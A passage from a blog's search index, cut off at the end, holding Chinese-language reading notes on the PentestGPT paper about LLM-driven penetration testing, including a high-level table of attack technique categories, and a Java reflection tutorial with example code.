<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【论文精度】SafeDrive Knowledge- and Data-Driven Risk-Sensitive Decision-Making for Autonomous Vehicles with Large Language Models</title>
      <link href="/2025/03/04/PaperReading/SafeDrive/"/>
      <url>/2025/03/04/PaperReading/SafeDrive/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attackqa</title>
      <link href="/2025/03/03/PaperReading/attackqa/"/>
      <url>/2025/03/03/PaperReading/attackqa/</url>
      
        <content type="html"><![CDATA[<p>todo: AttackQA: Development and Adoption of a Dataset for Assisting Cybersecurity Operations Using Fine-Tuned and Open-Source LLMs</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】PENTESTGPT Evaluating and Harnessing Large Language Models for Automated Penetration Testing</title>
      <link href="/2025/01/20/PaperReading/pentestgpt/"/>
      <url>/2025/01/20/PaperReading/pentestgpt/</url>
      
        <content type="html"><![CDATA[<h2 id="todo-这篇文章也可以看下"><a href="#todo-这篇文章也可以看下" class="headerlink" title="todo 这篇文章也可以看下"></a>todo 这篇文章也可以看下</h2><p><a href="https://www.secrss.com/articles/76018">https://www.secrss.com/articles/76018</a></p><p><a href="https://www.secrss.com/articles/59179">https://www.secrss.com/articles/59179</a><br>项目开源地址:<a href="https://github.com/GreyDGL/PentestGPT/">https://github.com/GreyDGL/PentestGPT/</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>论文主要介绍了一个基于大型语言模型（LLM）的自动化渗透测试工具PENTESTGPT以及它的设计和实现过程。作者通过对GPT-3.5、GPT-4和Bard三种LLM的评估，发现它们具有一定的渗透测试能力，但难以保持长期记忆和解决复杂问题。为了解决这些问题，作者设计了三个自交互的模块，分别解决渗透测试的不同子任务，并提出了一些有效的提示和策略。评估显示，PENTESTGPT比原始LLM的任务完成率提高了228.6%，并且在实际应用中也取得了良好的效果。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This study, guided by the principle “the best defense is a good offense”, focuses on offensive strategies, specifically penetration testing.<br>Consequently, an imperative question presents: To what extend can LLMs automate penetration testing?</p><p>测试基准: To address this limitation, we construct a robust benchmark that includes test machines from HackTheBox and VulnHub —two leading platforms for penetration tesing challenges. Comprising 13 targets with 182 sub-tasks, our benchmark encompasses all vulnerabilities appearing in OWASP’s top 10 vulnerability list and 18 Common Weakness Enumeration (CWE) items <a href="https://blog.csdn.net/u013129300/article/details/128487328">CWE介绍</a>.</p><p>大语言模型渗透测试时存在的主要优缺点: 大型语言模型特别擅长使用测试工具执行复杂的命令和选项，而像GPT-4这样的模型在理解源代码和确定漏洞方面表现出色。此外，大型语言模型可以制作适当的测试命令，并准确地描述特定任务所需的图形用户界面操作。利用他们庞大的知识库，他们可以设计出创造性的测试程序，以揭示现实世界系统和CTF挑战中的潜在漏洞。然而，我们也注意到大型语言模型在保持对总体测试场景的连贯把握方面有困难，这是实现测试目标的一个重要方面。随着对话的进行，他们可能会忽略先前的发现，并努力将他们的推理始终一致地应用于最终目标。此外，大型语言模型过分强调对话历史中最近的任务，而不管它们的漏洞状态。因此，他们往往会忽略之前测试中暴露的其他潜在攻击面，从而无法完成渗透测试任务。</p><p>PentestGPT 主要包括三个模块: Reasoning, Generation, and Parsing Modules. The Reasoning Module emulates the function of a lead tester, focusing on maintaining a high-level overview of the penetration testing status. We introduce a novel representation, the Pentesting Task Tree (PTT), based on the cybersecurity attack tree <a href="https://satoss.uni.lu/members/barbara/papers/adt.pdf">攻击树介绍</a>. 利用攻击树对测试过程状态进行编码,并指导后续操作.The Generation Module,mirroring a junior tester’s role, is responsible for constructing detailed procedures for specific sub-tasks. Translating these into exact testing operations augments the generation process’s accuracy. Meanwhile, the Parsing Module deals with diverse text data encountered during penetration testing, such as tool outputs, source codes, and HTTP web pages. It condenses and emphasizes these texts, extracting essential information.</p><p><img src="/2025/01/20/PaperReading/pentestgpt/image.png" alt="MALISM框架"><br>MALISSM是作者提出的一个完全自动化的渗透测试工具，将其命名为网络安全认知引擎，主要包括以下三个模块：<br>EXPLOITFLOW：通过捕获每个离散动作后的系统状态来生成安全开发路线(利用流)；<br>PENTESTGPT：利用LLMs为每个给定的离散状态启发式生成测试指导；<br>PENTESTPERF：一个综合渗透测试基准，用于评估渗透测试器和自动化工具在广泛的测试目标上的性能。</p><p>感觉自己之前也有这么想过,工程量很大…….</p><p>文章划分的子任务列表:</p><table><thead><tr><th>Phase</th><th>Technique</th><th>Description</th><th>Related CWEs</th></tr></thead><tbody><tr><td><strong>Reconnaissance</strong></td><td>Port Scanning</td><td>Identify the open ports and related information on the target machine.</td><td>CWE-668</td></tr><tr><td></td><td>Web Enumeration</td><td>Gather detailed information about the target’s web applications.</td><td></td></tr><tr><td></td><td>FTP Enumeration</td><td>Identify potential vulnerabilities in FTP (File Transfer Protocol) services to gain unauthorized access or data extraction.</td><td></td></tr><tr><td></td><td>AD Enumeration</td><td>Identify potential vulnerabilities or mis-configurations in Active Directory Services.</td><td></td></tr><tr><td></td><td>Network Enumeration</td><td>Identify potential vulnerabilities within the network infrastructure to gain unauthorized access or disrupt services.</td><td></td></tr><tr><td></td><td>Other enumerations</td><td>Obtain information of other services, such as smb service, custom protocols, etc.</td><td></td></tr><tr><td><strong>Exploitation</strong></td><td>Command Injection</td><td>Inject arbitrary commands to be run on a host machine, often leading to unauthorized system control.</td><td>CWE-77, CWE-78</td></tr><tr><td></td><td>Cryptanalysis</td><td>Analyze the weak cryptographic methods or hash methods to obtain sensitive information.</td><td>CWE-310</td></tr><tr><td></td><td>Password Cracking</td><td>Crack Passwords using rainbow tables or cracking tools.</td><td>CWE-326</td></tr><tr><td></td><td>SQL Injection</td><td>Exploit SQL vulnerabilities, particularly SQL injection to manipulate databases and extract sensitive information.</td><td>CWE-78</td></tr><tr><td></td><td>XSS</td><td>Inject malicious scripts into web pages viewed by others, allowing for unauthorized access or data theft.</td><td>CWE-79</td></tr><tr><td></td><td>CSRF&#x2F;SSRF</td><td>Exploit cross-site request forgery or server-site request forgery vulnerabilities.</td><td>CWE-352, CWE-918</td></tr><tr><td></td><td>Known Vulnerabilities</td><td>Exploit services with known vulnerabilities, particularly CVEs.</td><td>CWE-1395</td></tr><tr><td></td><td>XXE</td><td>Exploit XML external entity vulnerabilities to achieve code execution.</td><td>CWE-611</td></tr><tr><td></td><td>Brute-Force</td><td>Leverage brute-force attacks to gain malicious access to target services.</td><td>CWE-799, CWE-770</td></tr><tr><td></td><td>Deserialization</td><td>Exploit insecure deserialization processes to execute arbitrary code or manipulate object data.</td><td>CWE-502</td></tr><tr><td></td><td>Other Exploitations</td><td>Other exploitations such as AD specific exploitation, prototype pollution, etc.</td><td></td></tr><tr><td><strong>Privilege Escalation</strong></td><td>File Analysis</td><td>Enumerate system&#x2F;service files to gain malicious information for privilege escalation.</td><td>CWE-200, CWE-538</td></tr><tr><td></td><td>System Configuration Analysis</td><td>Enumerate system&#x2F;service configurations to gain malicious information for privilege escalation.</td><td>CWE-15, CWE-16</td></tr><tr><td></td><td>Cronjob Analysis</td><td>Analyze and manipulate scheduled tasks (cron jobs) to execute unauthorized commands or disrupt normal operations.</td><td>CWE-250</td></tr><tr><td></td><td>User Access Exploitation</td><td>Exploit the improper settings of user access in combination with system properties to conduct privilege escalation.</td><td>CWE-284</td></tr><tr><td></td><td>Other techniques</td><td>Other general techniques, such as exploiting running processes with known vulnerabilities.</td><td></td></tr><tr><td><strong>General Techniques</strong></td><td>Code Analysis</td><td>Analyze source codes for potential vulnerabilities.</td><td></td></tr><tr><td></td><td>Shell Construction</td><td>Craft and utilize shell codes to manipulate the target system, often enabling control or extraction of data.</td><td></td></tr><tr><td></td><td>Social Engineering</td><td>A various range of techniques to gain information to target system, such as constructing custom password dictionary.</td><td></td></tr><tr><td></td><td>Others</td><td>Other techniques</td><td></td></tr></tbody></table><p>文章开源的github库给出的Prompt: <a href="https://github.com/GreyDGL/PentestGPT/blob/main/pentestgpt/prompts/prompt_class.py">https://github.com/GreyDGL/PentestGPT/blob/main/pentestgpt/prompts/prompt_class.py</a></p><h2 id="Exploratory-Study"><a href="#Exploratory-Study" class="headerlink" title="Exploratory Study"></a>Exploratory Study</h2><p>RQ1(Capability): LLM可以在多大程度上执行渗透测试任务？<br>RQ2(Comparative Analysis): 人类渗透测试员和LLM的问题解决策略有何不同？</p><p>针对RQ1，发现如下：<br>Finding 1: LLM熟练执行端到端渗透测试任务，但难以应对更困难的目标；<br>Finding 2: LLMs可以有效地使用渗透测试工具，识别常见漏洞，并解释源代码以识别漏洞。</p><p>针对RQ2，发现如下：<br>Finding 3: LLMs很难维持长期记忆，而这对有效链接漏洞和制定利用策略至关重要；<br>Finding 4: LLMs倾向最近的任务和深度优先搜索，这会导致过度关注某一任务并忘记之前的发现；<br>Finding 5: LLMs可能会产生不准确的操作或命令。</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p><img src="/2025/01/20/PaperReading/pentestgpt/image-1.png" alt="Overview"></p><h3 id="Reasoning-Module"><a href="#Reasoning-Module" class="headerlink" title="Reasoning Module"></a>Reasoning Module</h3><p>似渗透测试任务的团队领导，从用户那里获取测试结果或意图，并为下一步准备测试策略。论文针对渗透测试引入了一种新的表示Pentesting Task Tree（见下图），该结构持续对测试过程的状态进行编码并引导后续动作。<br><img src="/2025/01/20/PaperReading/pentestgpt/image-2.png" alt="任务树"><br>文章设计了四组提示，依次引导推理模块完成每个阶段。为了增强结果的可重复性，我们使用一种称为<a href="http://export.arxiv.org/abs/2307.07415">提示生成</a>的技术进一步优化了这些提示。</p><h3 id="Generation-Module"><a href="#Generation-Module" class="headerlink" title="Generation Module"></a>Generation Module</h3><p><img src="/2025/01/20/PaperReading/pentestgpt/image-4.png" alt="An Illustrative Example"><br>类似初级测试人员的角色，采用CoT策略将推理模块中的特定子任务转换为具体的操作命令或指令，确保精确且可操作的步骤来提高测试过程的准确性。<br><img src="/2025/01/20/PaperReading/pentestgpt/image-3.png" alt="PTT示例"></p><h3 id="Parsing-Module"><a href="#Parsing-Module" class="headerlink" title="Parsing Module"></a>Parsing Module</h3><p>充当支持接口，能够有效地处理用户与其他两个核心子模块之间交换的自然语言信息。</p><p><a href="https://www.youtube.com/watch?v=h0k6kWWaCEU">https://www.youtube.com/watch?v=h0k6kWWaCEU</a></p><p>看了下他们的测试视频 感觉似乎很一般啊</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】Java 反射机制</title>
      <link href="/2024/12/20/code/javareflection/"/>
      <url>/2024/12/20/code/javareflection/</url>
      
        <content type="html"><![CDATA[<h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        printClassInfo(<span class="string">&quot;&quot;</span>.getClass());</span><br><span class="line">        printClassInfo(Runnable.class);</span><br><span class="line">        printClassInfo(java.time.Month.class);</span><br><span class="line">        printClassInfo(String[].class);</span><br><span class="line">        printClassInfo(<span class="type">int</span>.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printClassInfo</span><span class="params">(Class cls)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Class name: &quot;</span> + cls.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Simple name: &quot;</span> + cls.getSimpleName());</span><br><span class="line">        <span class="keyword">if</span> (cls.getPackage() != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Package name: &quot;</span> + cls.getPackage().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;is interface: &quot;</span> + cls.isInterface());</span><br><span class="line">        System.out.println(<span class="string">&quot;is enum: &quot;</span> + cls.isEnum());</span><br><span class="line">        System.out.println(<span class="string">&quot;is array: &quot;</span> + cls.isArray());</span><br><span class="line">        System.out.println(<span class="string">&quot;is primitive: &quot;</span> + cls.isPrimitive());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息；<br>获取一个class对应的Class实例后，就可以获取该class的所有信息；<br>通过Class实例获取class信息的方法称为反射（Reflection）；<br>JVM总是动态加载class，可以在运行期根据条件来控制加载class。</p><h2 id="访问字段"><a href="#访问字段" class="headerlink" title="访问字段"></a>访问字段</h2><p>对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。</p><ul><li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li><li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li><li>Field[] getFields()：获取所有public的field（包括父类）</li><li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">        <span class="comment">// 获取public字段&quot;score&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取继承的public字段&quot;name&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取private字段&quot;grade&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>以String类的value字段为例，它的定义是：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span>[] value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字段信息</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> String.class.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">f.getName(); <span class="comment">// &quot;value&quot;</span></span><br><span class="line">f.getType(); <span class="comment">// class [B 表示byte[]类型</span></span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> f.getModifiers();</span><br><span class="line">Modifier.isFinal(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isPublic(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isProtected(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isPrivate(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isStatic(m); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>通过反射获取对象的字段值可以用下面的方法:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> f.get(p);</span><br><span class="line">        System.out.println(value); <span class="comment">// &quot;Xiao Ming&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>运行代码，如果不出意外，会得到一个IllegalAccessException，这是因为name被定义为一个private字段，正常情况下，Main类无法访问Person类的private字段。要修复错误，可以将private改为public，或者，在调用Object value &#x3D; f.get(p);前，先写一句：<code>f.setAccessible(true);</code><br>setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。</li></ul><p>可以通过set方法设置字段的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Xiao Ming&quot;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(p, <span class="string">&quot;Xiao Hong&quot;</span>);</span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Xiao Hong&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><p>Class类提供了以下几个方法来获取Method：</p><ul><li>Method getMethod(name, Class…)：获取某个public的Method（包括父类）</li><li>Method getDeclaredMethod(name, Class…)：获取当前类的某个Method（不包括父类）</li><li>Method[] getMethods()：获取所有public的Method（包括父类）</li><li>Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">        <span class="comment">// 获取public方法getScore，参数为String:</span></span><br><span class="line">        System.out.println(stdClass.getMethod(<span class="string">&quot;getScore&quot;</span>, String.class));</span><br><span class="line">        <span class="comment">// 获取继承的public方法getName，无参数:</span></span><br><span class="line">        System.out.println(stdClass.getMethod(<span class="string">&quot;getName&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取private方法getGrade，参数为int:</span></span><br><span class="line">        System.out.println(stdClass.getDeclaredMethod(<span class="string">&quot;getGrade&quot;</span>, <span class="type">int</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getScore</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getGrade</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>输出类似下面的:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int Student.getScore(java.lang.String)</span><br><span class="line">public java.lang.String Person.getName()</span><br><span class="line">private int Student.getGrade(int)</span><br></pre></td></tr></table></figure>一个Method对象包含一个方法的所有信息：</li><li>getName()：返回方法名称，例如：”getScore”；</li><li>getReturnType()：返回方法返回值类型，也是一个Class实例，例如：String.class；</li><li>getParameterTypes()：返回方法的参数类型，是一个Class数组，例如：{String.class, int.class}；</li><li>getModifiers()：返回方法的修饰符，它是一个int，不同的bit表示不同的含义。</li></ul><h3 id="调用方法-1"><a href="#调用方法-1" class="headerlink" title="调用方法"></a>调用方法</h3><p>当我们获取到一个Method对象时，就可以对它进行调用。我们以下面的代码为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> s.substring(<span class="number">6</span>); <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure><p>如果用反射来调用substring方法，需要以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reflection</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// String对象:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        <span class="comment">// 获取String substring(int)方法，参数为int:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 在s对象上调用该方法并获取结果:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> (String) m.invoke(s, <span class="number">6</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(r); <span class="comment">// &quot;world&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意到substring()有两个重载方法，我们获取的是String substring(int)这个方法。</span></span><br><span class="line"><span class="comment">// 获取String substring(int, int)方法，参数为两个int:</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// 在s对象上调用该方法并获取结果:</span></span><br><span class="line"><span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> (String) m.invoke(s, <span class="number">6</span>, <span class="number">11</span>); <span class="comment">// 使用6和11来获取&quot;world&quot;</span></span><br></pre></td></tr></table></figure><h3 id="调用静态方法"><a href="#调用静态方法" class="headerlink" 